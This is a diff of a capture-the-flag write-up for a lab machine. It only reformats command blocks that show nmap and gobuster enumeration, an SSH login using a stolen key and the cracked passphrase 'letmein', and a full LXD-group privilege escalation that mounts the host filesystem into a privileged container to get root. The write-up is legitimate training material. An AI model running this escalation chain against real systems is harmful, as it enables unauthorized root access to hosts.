@@ -54,9 +54,7 @@ $ nmap -p 22,80 -sV -T4 10.48.153.3
 \`\`\`
 
 \`\`\`shell
-$ gobuster dir -u http://10.48.153.3 \\
-    -w DirBuster-2007_directory-list-lowercase-2.3-small.txt \\
-    -x php,html,txt
+$ gobuster dir -u http://10.48.153.3 -w DirBuster-2007_directory-list-lowercase-2.3-small.txt -x php,html,txt
 index.html    (Status: 200)
 about.html    (Status: 200)
 about.php     (Status: 200)
@@ -205,7 +203,8 @@ $ chmod 600 secretKey
 $ ssh -i secretKey john@10.48.153.3
 Enter passphrase for key 'secretKey': letmein
 john@exploitable:~$ id
-uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo) \\
+,30(dip),46(plugdev),108(lxd)
 \`\`\`
 
 ![Logged in over SSH as john, dropped to a shell prompt](/writeups/gaming-server/foothold-ssh-login-success.png)
@@ -260,12 +259,12 @@ Pull it onto the target:
 filesystem mounted in:
 
 \`\`\`shell
-john@exploitable:~$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
-john@exploitable:~$ lxc init myimage ignite -c security.privileged=true
-john@exploitable:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
-john@exploitable:~$ lxc start ignite
-john@exploitable:~$ lxc exec ignite /bin/sh
-~ # id
+$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+$ lxc init myimage ignite -c security.privileged=true
+$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+$ lxc start ignite
+$ lxc exec ignite /bin/sh
+$ id
 uid=0(root) gid=0(root)
 \`\`\`
 
